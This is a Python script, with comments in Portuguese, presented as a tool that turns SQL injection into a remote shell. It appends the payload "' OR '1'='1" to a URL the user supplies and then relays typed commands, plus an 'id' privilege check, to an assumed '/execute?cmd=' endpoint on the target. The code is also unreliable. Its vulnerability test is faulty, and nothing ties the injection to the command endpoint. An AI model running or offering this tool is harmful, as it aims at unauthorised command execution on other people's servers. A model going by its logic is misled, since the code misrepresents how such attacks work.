import requests

def verificar_vulnerabilidade(url, headers=None):
    # Testar injeção de SQL básica
    vulnerable = False
    teste_injecao = "' OR '1'='1"
    try:
        response = requests.get(url + teste_injecao, headers=headers)
        if "syntax" not in response.text.lower():
            vulnerable = True
            print("[+] Vulnerabilidade de SQL Injection detectada!")
        else:
            print("[-] Nenhuma vulnerabilidade detectada.")
    except Exception as e:
        print(f"Erro ao verificar a vulnerabilidade: {e}")

    return vulnerable

def puxar_shell(url, headers=None):
    # Simular o processo de abertura de uma shell
    print("[+] Tentando puxar uma shell no servidor vulnerável...")
    shell_puxada = False
    
    while True:
        comando = input("Shell> ")
        if comando.lower() == "exit":
            print("[+] Fechando shell.")
            break

        # Tentativa de elevação de privilégio
        try:
            response = requests.get(f"{url}/execute?cmd={comando}", headers=headers)
            if response.status_code == 200:
                print(response.text)
                shell_puxada = True  # Indica que o comando foi executado com sucesso
            else:
                print(f"Erro ao executar comando: Código de status {response.status_code}")
        except Exception as e:
            print(f"Erro ao executar comando: {e}")

        # Tentativa de elevação de privilégio adicional
        try:
            # Exemplo de tentativa de execução de comando para obter informações de elevação
            priv_cmd = "id"  # ou outro comando que pode ajudar a verificar os privilégios
            response = requests.get(f"{url}/execute?cmd={priv_cmd}", headers=headers)
            print("Informações de privilégios:", response.text)
        except Exception as e:
            print(f"Erro ao tentar obter informações de privilégios: {e}")

    if shell_puxada:
        print("[+] Shell puxada com sucesso!")

def main():
    print("=== Ferramenta de SQL Injection para Shell Remota ===")
    url = input("Digite a URL do site a ser verificado: ")
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
        'Accept': '*/*'
    }

    if verificar_vulnerabilidade(url, headers=headers):
        puxar_shell(url, headers=headers)
    else:
        print("[-] Não foi possível encontrar uma vulnerabilidade SQL Injection.")

if __name__ == "__main__":
    main()
